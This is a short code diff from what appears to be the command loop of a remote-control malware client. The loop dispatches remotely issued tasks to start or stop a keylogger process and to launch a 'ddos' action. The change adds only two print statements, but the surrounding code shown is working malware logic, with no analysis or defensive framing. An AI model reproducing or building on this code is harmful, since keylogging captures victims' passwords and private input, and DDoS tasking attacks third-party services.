@@ -62,12 +62,14 @@ while True:
 
         # The keylogger cannot be stopped except by stopping the whole program!!
         elif task[0] == 'startkeylogger':
+            print("Started keylogger")
             if(keyloggerprocess.is_alive()):
                 os.kill(keyloggerprocess.pid, SIGTERM)
             keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
             keyloggerprocess = Process(target = keylogger.start)
             keyloggerprocess.start()
         elif task[0] == "stopkeylogger":
+            print("Stopped keylogger")
             if(keyloggerprocess.is_alive()):
                 os.kill(keyloggerprocess.pid, SIGTERM)
         elif task[0] == 'ddos':
